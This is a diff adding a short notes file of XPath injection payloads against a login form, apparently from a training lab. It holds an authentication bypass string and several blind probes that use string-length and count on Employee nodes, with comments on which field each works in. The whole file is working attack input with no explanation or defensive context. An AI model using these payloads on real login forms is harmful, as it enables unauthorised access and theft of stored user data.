@@ -1,0 +1,10 @@
+Payloads:
+ABaker' or '1'='1&Password=blah // It Works
+ABaker']"// Not works
+
+ABaker' and string-length(//Employee[position()=1]/child::node()[position()=2])=5 and '1'='1
+ABaker' and string-length(//Employee[position()=2]/child::node()[position()=2])=3 and '1'='1
+
+
+A' or string-length(//Employee[position()=1]/child::node()[position()=2])=5 and '1'='1  //it works only if we type this to password field
+A' or count(//Employee[position()=1]/child::node())=5 and '1'='1  //it works only if we type this to password field
